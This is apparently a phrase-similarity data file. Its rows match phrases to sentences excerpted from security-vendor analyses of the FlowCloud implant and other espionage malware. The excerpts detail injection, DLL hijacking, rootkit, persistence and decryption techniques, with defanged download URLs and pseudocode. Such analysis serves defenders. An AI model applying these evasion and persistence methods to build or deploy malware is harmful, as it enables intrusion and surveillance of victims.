phrase|similarity|adjacent_sentences
deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis|0.8562604815010033|['URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document The identical encrypted file was also downloaded from http://114.55.109[.', ']199:56022/SL3716/S8437AEB.DAT by a FlowCloud dropper version 4.1.3 (SHA1: 014421BDB1EA105A6DF0C27FC114819FF3637704).', 'A summary of the compromise chain is provided in Figure 6.', '5/26Figure 6.', 'Compromise chain from the Royal Road document to FlowCloud FlowCloud FlowCloud is a complex implant written in C++.', 'It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.', 'Multiple versions of FlowCloud have been identified since 2020, most notably versions 4.1.3 and 5.0.1 described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.', 'This deployment process is very similar to the one described by Proofpoint for version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.']
deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis|0.8562604815010033|['This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section.Figure 5.', 'URL requests seen by the VirusTotal sandbox during execution of the malicious RTF documentThe identical encrypted file was also downloaded fromhttp://114.55.109[.', ']199:56022/SL3716/S8437AEB.DATby a FlowCloud dropper version 4.1.3 (SHA1:014421BDB1EA105A6DF0C27FC114819FF3637704).', 'A summary of the compromise chain is provided in Figure 6.Figure 6.', 'Compromise chain from the Royal Road document to FlowCloudFlowCloudFlowCloud is a complex implant written in C++.', 'It consists of three main components, deployed in a multistage process that uses various obfuscation and encryption techniques to hinder analysis.', 'Multiple versions of FlowCloud have been identified since 2020, most notably versions4.1.3and5.0.1described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.This deployment process is very similar to the one described byProofpointfor version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.']
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.|0.8824035070635776|['Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.', 'This deployment process is very similar to the one described by Proofpoint for version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.', 'Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the droppers resources Resource ID Role Internal name 100 FlowCloud RAT DLL fcClientDll 101 32-bit rootkit driver Driver 102 64-bit rootkit driver Driver 6/26Resource ID Role Internal name 103 DLL hijacking vulnerable app N/A 104 Shellcode loaded by the malicious library in the DLL hijacking SETLANG_dlcore 105 Shellcode that loads fcClient (unused) N/A 106 Final dropper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 110 DLL used for hijacking XXXModule_dlcore0 1000 Protobuf serialized FlowCloud configuration N/A 1001 Dropper configuration N/A 2000 Used as an alternative or extension to resource 2001 N/A 2001 Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000 Installation configuration N/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.']
The values for these executables and configuration data can be found, encrypted, in the loader’s resource section.|0.8824035070635776|['Multiple versions of FlowCloud have been identified since 2020, most notably versions4.1.3and5.0.1described by Proofpoint.', 'In this section, we analyze FlowCloud versions 5.0.2 and 5.0.3.', 'Contrary to those previously found, the samples we obtained for version 5.0.2 contain verbose error messages and meticulous logging.This deployment process is very similar to the one described byProofpointfor version 5.0.1.', 'The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.Table 1.', 'Contents of the droppers resourcesResource IDRoleInternal name100FlowCloud RAT DLLfcClientDll10132-bit rootkit driverDriver10264-bit rootkit driverDriver103DLL hijacking vulnerable appN/A104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore105Shellcode that loadsfcClient(unused)N/A106Final dropper stagefcClient10732-bit persistence modulefcClientWD_x8610864-bit persistence modulefcClientWD_x64109Legitimate library used for module stompingslam110DLL used for hijackingXXXModule_dlcore01000Protobuf serialized FlowCloud configurationN/A1001Dropper configurationN/A2000Used as an alternative or extension to resource 2001N/A2001Path to the registry key for the PrintProcessor service (used by the driver)N/A10000Installation configurationN/AIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.']
In some cases, they are then re-encrypted but with a different key|1.0|['Loader (ClientLdrExe) The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.', 'Table 1.', 'Contents of the droppers resources Resource ID Role Internal name 100 FlowCloud RAT DLL fcClientDll 101 32-bit rootkit driver Driver 102 64-bit rootkit driver Driver 6/26Resource ID Role Internal name 103 DLL hijacking vulnerable app N/A 104 Shellcode loaded by the malicious library in the DLL hijacking SETLANG_dlcore 105 Shellcode that loads fcClient (unused) N/A 106 Final dropper stage fcClient 107 32-bit persistence module fcClientWD_x86 108 64-bit persistence module fcClientWD_x64 109 Legitimate library used for module stomping slam 110 DLL used for hijacking XXXModule_dlcore0 1000 Protobuf serialized FlowCloud configuration N/A 1001 Dropper configuration N/A 2000 Used as an alternative or extension to resource 2001 N/A 2001 Path to the registry key for the PrintProcessor service (used by the driver)N/A 10000 Installation configuration N/A In the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.', 'The samples we analyzed all store their files in the %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\ directory; we believe that this is the default value.', 'FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g., rebare.dll which could be mistaken for rebar.dll) or innocuous looking (e.g., AC146142) to avoid suspicion.', 'Figure 7 presents a graphical overview of the deployment process and its elements.']
In some cases, they are then re-encrypted but with a different key|1.0|['The three main components are a driver with rootkit functionality, a simple persistence module, and a custom backdoor.', 'We describe these in detail in the upcoming sections.Loader (ClientLdrExe)The first stage is responsible mostly for creating the files and registry keys used by the other stages.', 'The values for these executables and configuration data can be found, encrypted, in the loaders resource section.', 'Table 1 contains an overview of these resources and their use.Table 1.', 'Contents of the droppers resourcesResource IDRoleInternal name100FlowCloud RAT DLLfcClientDll10132-bit rootkit driverDriver10264-bit rootkit driverDriver103DLL hijacking vulnerable appN/A104Shellcode loaded by the malicious library in the DLL hijackingSETLANG_dlcore105Shellcode that loadsfcClient(unused)N/A106Final dropper stagefcClient10732-bit persistence modulefcClientWD_x8610864-bit persistence modulefcClientWD_x64109Legitimate library used for module stompingslam110DLL used for hijackingXXXModule_dlcore01000Protobuf serialized FlowCloud configurationN/A1001Dropper configurationN/A2000Used as an alternative or extension to resource 2001N/A2001Path to the registry key for the PrintProcessor service (used by the driver)N/A10000Installation configurationN/AIn the instances we observed, most resources are written to disk encrypted, and only decrypted in memory when needed.', 'In some cases, they are then re-encrypted but with a different key.', 'This technique makes it harder to dump the plaintext values from the processs memory and to analyze exit dumps.', 'The paths and registry keys to use, and whether they should be decrypted before being written, are defined in the installation configuration.', 'The samples we analyzed all store their files in the%ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\directory; we believe that this is the default value.', 'FlowCloud uses filenames that are either similar to those of legitimate Windows files (e.g.,rebare.dllwhich could be mistaken forrebar.dll) or innocuous looking (e.g.,AC146142) to avoid suspicion.Figure 7 presents a graphical overview of the deployment process and its elements.', 'We explain each of the steps in further detail in the upcoming sections.Figure 7.']
Base64-encoded strings|0.7816227854077806|['Figure 4.', 'Dolphin evolution timeline November 2021 version 2.0 Version 2.0 introduced the following changes to the version found in April 2021: 6/8Dynamic resolution of suspicious APIs instead of static imports (for example GetAsyncKeyState) added Shellcode capability finished and improved Persisted shellcode stored in files instead of registry Persisted shellcode loaded and executed on Dolphin startup (previously missing) Portable device file exfiltration capability finished and improved Exfiltration by extensions added Recognition of internal memory and SD cards (from device ID) added Command to get files from portable devices effectively a NOP Device/drive detection and file exfiltration improved Dolphin now unconditionally creates directory listings and exfiltrates files by extension every 30 minutes for all drives and devices (fixed drives, removable drives, portable devices).', 'Previously, it was just for removable drives; fixed drives were disabled by default and the code used for accessing portable devices was buggy and broken.', 'December 2021 version 2.2 Changes introduced in version 2.2 focused mainly on detection evasion.', 'The credential-stealing capability and commands related to it the credential stealing and Google account commands were removed.', 'Most strings in this version are base64 encoded.', 'January 2022 version 3.0 In version 3.0, the code was reorganized and classes renamed, with capabilities remaining unchanged.', 'The base64- encoded strings were plaintext again in this version.', 'We observed the following additional changes: Command to steal credentials restored in a different form; it now executes shellcode from the C&C Command to get files from portable devices completely removed Command to get files from drives is now cached/stored in the configuration until completion.', 'If interrupted (for example by computer shutdown), it is done on the next run.', 'This is also useful in the case of removable drives that may not be connected when the command is issued.']
This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC|1.0000000000000002|['This corroborates the observation by Proofpoint researchers.', 'This module is embedded in the librarys resource section and encrypted with an algorithm similar to RC4.', 'The encryption/decryption function, shown in Figure 20, always uses the same key.', 'Figure 20.', 'Decompiled view of the function used to encrypt and decrypt the embedded module The SodomNormal component tries to read configuration information from a sodom.ini file.', 'This configuration file is encrypted using the just-described function and starts with the magic bytes 0xAF1324BC.', 'If this file is unavailable or invalid, a hardcoded default configuration is used.', 'A unique victim ID is then generated from the victims CPUID, username, and IP address.', 'This is sent to the server along with the computers name and the configuration data.', 'The communications module then downloads the main backdoor module, named SodomMain, from the C&C server.', 'Unfortunately, we couldnt obtain this module.']
the self-decrypting DLL,|0.7938865963333279|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme|0.9102493348629656|['This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.']
It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme|0.9102493348629656|['It does not collect these directly, but instead acts in tandem with the keylogger component of the driver (described in the next section) by reading data from the\\\\\\\\.\\\\pipe\\\\namedpipe_keymousespy_englishnamed pipe.Interestingly, FlowCloud can also gather information about things happening around the victims computer.', 'The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using theCCameraDSclass from OpenCV.The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by thedecibel_limitfield of theaudio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly definedto be anywhere between 50 and 70dB by various sources).Self-decrypting DLL (setlangloc.dat)The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and-ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions ofLoadLibraryand calls the loaded modulesstartModuleexport.for (int i=0; i < ciphertext_length; i++)    plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFFFigure 16.', 'Pseudocode for the DLL decryption routineThis newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own:Covers its tracks by overwriting the code previously modified by the malicious library with a useless call tolstrlenW.Base64-encoded strings are used for function imports (viaGetProcAddress) and only decoded as needed.Exits if the processs executable is not the expected DLL hijacking target (e.g.,setlang.exe).The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.', 'This code inside the new process launches a thread that decrypts and loads thefcClientmodule before calling itsstartModuleexport.']
Self-decrypting DLL|0.7938514540895094|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
The loaded shellcode is a self-decrypting DLL.|0.8177778476979808|['The first way it does so is through a C&C command that takes a picture using connected camera peripherals.', 'This feature is implemented using the CCameraDS class from OpenCV.', 'The second way it can collect information about the computers surroundings is by recording audio.', 'Much like a voice assistant, FlowCloud can use a computers microphone to listen to its surroundings, but instead of recording being triggered by a command word, it seems to be triggered by any sound over a threshold defined by the decibel_limit 16/26field of the audio_policy.', 'The default value is 65 decibels, which is in the upper range of normal conversation volume (commonly defined to be anywhere between 50 and 70 dB by various sources).', 'Self-decrypting DLL (setlangloc.dat) The loaded shellcode is a self-decrypting DLL.', 'It first decrypts the embedded DLL using a byte-oriented XOR-and- ADD scheme (shown in Figure 16).', 'The shellcode we analyzed used the key 0x7B.', 'Once it has decrypted the embedded DLL, the shellcode manually performs the functions of LoadLibrary and calls the loaded modules startModule export.', '1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.']
The decrypted shellcode|0.7568712481409728|['The McUtil.dll variant uses a different technique.', 'At first glance, it looks as if like the main function does nothing malicious, but in fact it replaces the .text section of the legitimate mcoemcpy.exe, a side-loaded binary.', 'It generates shellcode whose purpose is to call the function reading the encrypted stage-two shellcode in the mcscentr.adf file.', '12OceanLotus Old techniques, new backdoor The following pseudocode is used to create the shellcode: x = False i = 0 buff = genRandom() opc1 = [0x58,0x59,0x5a,0x5b] opc2 = [0x50,0x51,0x52,0x53,0x54,0x55,0x56,0x57] opc3 = [0x90,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48, 0x49,0x4a,0x4b] while i < len(buff): currentChar = buff[i] if currentChar < 0xc8: buff[i] = opc1[currentChar % len(opc1)] else: if x: buff[i] = opc2[currentChar % len(opc2)] else: buff[i] = opc3[currentChar % len(opc3)] x = x == False i+=1 The result is the following assembly listing: Figure 9 Generated shellcode Stage 2 to Stage 4 Shellcode, Launcher and Shellcode again The shellcode decrypts and loads the library {E1E4CBED-5690-4749-819D-24FB660DF55F}.dll.', 'The library retrieves its resource and tries to start the service DeviceAssociationService.', 'The decrypted data also contains shellcode.', 'The latter decrypts the final layer: the backdoor.', '13OceanLotus Old techniques, new backdoor The variant {92BA1818-0119-4F79-874E-E3BF79C355B8}.dll checks whether rastlsc.exe was executed with krv as the first parameter.', 'If so, then a job is created and rastlsc.exe is executed again, but without the parameter.', 'Stage 5 The backdoor, {A96B020F-0000-466F-A96D-A91BBF8EAC96}.dll The malware first tries to retrieve its resource and decrypt it using RC4.', 'The decrypted resource contains an interesting piece of information, used to configure the backdoor.']
into the shellcode that will decompress and load the Korplug payload.|0.8088350809789995|['Despite being well known, it is still in use and we have observed TA410 using it as recently as in April 2021.', 'In the case of TA410, Korplug arrives as a RARSFX archive, generally named m.exe, containing three files: qrt.dll: A custom loader.', 'qrtfix.exe: A legitimate signed application from F-Secure, vulnerable to DLL search-order hijacking.', 'qrt.dll.usb: The Korplug shellcode.', 'The loader allocates memory using VirtualAlloc and copies the content of qrt.dll.usb there.', 'Then it jumps right into the shellcode that will decompress and load the Korplug payload.', 'QuasarRAT QuasarRAT is a full-featured backdoor freely available on GitHub.', 'It is used by numerous threat actors who perform cyberespionage or cybercrime.', 'TA410 uses a custom downloader and a custom loader written in .NET, which are convenient for identifying their instances of QuasarRAT among all the noise created by other attackers.', 'Named sll.exe, this downloader is digitally signed with the certificate seen in Figure 23.', 'The certificate is likely stolen and belongs to (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252.']
The next stage, injected into iexplore.exe|0.7713997774839967|['The malware was compiled on 24 th November 2015 and it is a 32-bit DLL.', 'This shows that the sample is recent and indicates the threat actor is currently active.', 'Examining the PE structure of Syncmgr.dll shows a hidden executable embedded as one of the resources: Figure 7: Executable embedded in resource.', 'Once SyncManager.dll is executed, an iexplore.exe process is spawned: Figure 8: A malicious iexplore.exe process spawned.', 'Unsurprisingly, the strings of the iexplore.exe process reveals that the malware has injected itself into the process.', 'Figure 9: Malware injected into iexplore.exe.', 'By visualising the ProcessMonitor logs in ProcDOT, we see that two more files are created by the malware: WEB2013BW6.DAT and 60HGBC00.DAT.Figure 10: Malware creates two addition .DAT files.', 'By comparing the code constructs between the embedded resource ASDASDASDASDSAD and WEB2013BW6.DAT, we see that they contain the identical code, as shown below: Figure 11: The embedded resource (left) and WEB2013BW6.DAT have similar code constructs.', 'However, WEB2013BW6.DAT is over 500MB in size which is significantly larger than ASDASDASDASDSAD which is only 51KB in size: Figure 12: Dropped files in AppData\\\\Roaming\\\\Programs folder.', 'An examination into the PE structure of WEB2013BW6.DAT shows that a significant amount of junk characters are appended to the foot of the file: Figure 13: Padding towards the end of WEB2013BW6.DAT.', 'Based on its contents, the .DAT file is likely a component responsible for network communication.']
The injected code loads the same backdoor (rescure.dat) into the process’s memory and calls its startModule export to finish the installation.|0.9295781624644182|['On Windows 10 machines, the system time is briefly changed to make it look like the service was created in January 2013.', 'Both this and the use of the legitimate driver directory help the rootkit blend in with other drivers.', 'The following files are copied to the %System% directory: The backdoor: rescure.dat A decoy DLL: sspisrvui.dat as sspisrvui.dll (timestomped to July 2013) The encrypted shellcode: rebare.dat The rebare.dat shellcode is very similar to that used in the self-decrypting DLL, but it loads fcClient directly.', 'FlowCloud then starts a suspended process to perform injection on it.', 'This process is created via CreateProcessAsUserW using a token retrieved from the explorer.exe or winlogon.exe process in the current session.', 'The injected code loads the same backdoor (rescure.dat) into the processs memory and calls its startModule export to finish the installation.', 'Meanwhile, the injection process is terminated.', '11/26At this point, installation of the backdoor is complete.', 'All that is left is to execute the backdoor.', 'To achieve this, the new process loads the decoy DLL and manually replaces its content in memory with the fcClientDll module (a process known as module stomping or DLL hollowing), before calling its main function.', 'fcClientDll (responsor.dat) This complex module is the main component of the backdoor.']
the injection process|0.8187280981229277|"['Threat actors can add or remove features according to their malicious intentions.', ""Employing Cobalt Strike beacons in the attacks' infection chain allows the attackers to blend their malicious traffic with legitimate traffic and evade network detections."", 'Also, with its capabilities to configure commands in the beacon configuration, the attacker can perform various malicious operations such as injecting other malicious binary into the running processes of the infected machines and can avoid having a separate injection module implants in their infection chain.', 'The Cobalt Strike beacon configurations of this campaign showed us various characteristics of the beacon binary: C2 server.', 'Communication protocols.', 'Process injection techniques.', 'Malleable C2 Instructions.', 'Target process to spawn for x86 and x64 processes.', 'Watermark : ""Xi54kA=="".', '7/10Cobalt Strike beacon configuration sample.', 'The Cobalt Strike beacon used in this campaign has the following capabilities: Executes arbitrary codes in the target processes through process injection.']"
perform process injection to masquerade as harmless processes.|0.7618918136675107|['Information Masquerading: The driver component of FlowCloud masquerades as a T1036.004Masquerade Task or mouse driver service.', 'Service Masquerading: Match Files named after legitimate utilities are written into the T1036.005Legitimate Name or %ProgramFiles%\\\\MSBuild\\\\Microsoft\\\\Expression\\\\Blend\\\\msole\\\\ Location subdirectory.', 'FlowCloud uses a rootkit to hide its network traffic and T1014 Rootkit processes from system utilities.', 'Process Injection: FlowCloud uses both regular and reflective DLL injection.', 'It T1055.001Dynamic-link Library also manually loads some DLLs, bypassing calls to Injection LoadLibrary.', 'TA410s backdoors perform process injection to masquerade T1055 Process Injection as harmless processes.', 'Process Injection: One of FlowClouds DLLs replaces instructions in the loading Defense T1055.003Thread Execution process to make it execute code written in its memory.', 'Evasion Hijacking Process Injection: FlowCloud uses module stomping to hide the loading of its T1055.012 Process Hollowing main backdoor.', 'Deobfuscate/Decode Multiple TA410 backdoors communicate with their C&C T1140 Files or Information through encrypted and obfuscated channels.', 'Hijack Execution FlowCloud uses DLL Side-Loading to launch its second-stage T1574.002Flow: DLL Side- dropper.', 'Loading Virtualization/SandboxSome versions of FlowCloud use the Pafish utility to detect T1497 Evasion virtualization, sandboxes, and debuggers.']
The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.|1.0|['1for (int i=0; i < ciphertext_length; i++) 2 plaintext[i] = ((encrypted[i] ^ key) + key) & 0xFF Figure 16.', 'Pseudocode for the DLL decryption routine This newly loaded module uses the same anti-debugging and anti-analysis techniques as the hijacking DLL described above.', 'On top of those, it also uses a few tricks of its own: Covers its tracks by overwriting the code previously modified by the malicious library with a useless call to lstrlenW.', 'Base64-encoded strings are used for function imports (via GetProcAddress) and only decoded as needed.', 'Exits if the processs executable is not the expected DLL hijacking target (e.g., setlang.exe).', 'The module creates a new process using the same executable and performs process injection on it, redirecting the existing thread to the written code region.', 'This code inside the new process launches a thread that decrypts and loads the fcClient module before calling its startModule export.', 'That function will perform the final stages of the installation and load the DLL containing the backdoor functionality.', 'Driver (hidmouse.sys) FlowClouds driver serves a dual purpose: it acts as both a keylogger and a rootkit.', 'It accomplishes this mainly by hijacking native drivers handler functions for specific I/O control codes and replacing them with its own: Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0) Read (IRP_MJ_READ) for the mouse driver (mouclass or PointerClass0) Device control (IRP_MJ_DEVICE_CONTROL) for the network driver (tcpip or nsiproxy) The driver also provides kernel-level functionalities to be used by the RAT.', 'They can be invoked via IO control codes or by writing to specific registry keys.']
The loader injects an orchestrator into memory in a svchost.exe process.|0.8277118656769606|['TA410 LookingFrog LookingFrog uses two main malware families: X4 and LookBack.', 'We have seen both of them on machines belonging to the same victim.', 'X4 X4 is a custom backdoor that is used as a first stage, before LookBack is deployed.', 'It is loaded by a VMProtect-ed loader, usually named PortableDeviceApi.dll or WptsExtensions.dll.', 'Unfortunately, we were not able to uncover any persistence method.', '18/26The loader injects an orchestrator into memory in a svchost.exe process.', 'In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\\\\ProgramData\\\\Microsoft\\\\Crypto\\\\RSA\\\\MachineKeys\\\\Log\\\\rsa.txt.', 'Figure 18 shows a summary of the X4 components.', 'Figure 18.', 'Summary of the X4 components The network component is shellcode.', 'It is encrypted using the AES algorithm and stored in the Windows registry.']
Persistence for the downloaded payload is established via the Tendyron value under the Run key HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.|0.8647745250714022|[']93:1702/okt.dat written to %localappdata%\\\\Tendyron\\\\OnKeyToken_KEB.dll (SHA1: F359D3C074135BBCA9A4C98A6B6544690EDAE93D) http://103.139.2[.', ']93:1702/md.dat written to %localappdata%\\\\Tendyron\\\\Tendyron.conf (we were not able to retrieve this file) Finally, this process separately downloads http://103.139.2[.', ']93:1702/t86.dat (resource 101), loads it into memory, and calls its startModule export.', 'Unfortunately, we were not able to retrieve this sample.', 'Tendyron.exe is a legitimate executable, signed by online-banking security vendor Tendyron Corporation, and that is vulnerable to DLL search-order hijacking.', 'Persistence for the downloaded payload is established via the Tendyron 4/26value under the Run key HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run.', 'When executed, Tendyron.exe loads the malicious OnKeyToken_KEB.dll.', 'The export OnKeyT_ContextInit contains code that decrypts hardcoded shellcode (see Figure 4) and injects it into iexplore.exe using WriteProcessMemory.', 'Figure 4.', 'Shellcode decryption loop The next stage, injected into iexplore.exe, is a backdoor written using the Microsoft Foundation Class (MFC) framework.', 'It also contains RTTI symbols and thus a few C++ class names: ClientSocket Manager DllManager KernelManager These class names are the same as used in Farfli/Gh0stRAT, a backdoor that has been used for more than 10 years to conduct (mostly) cyberespionage operations.']
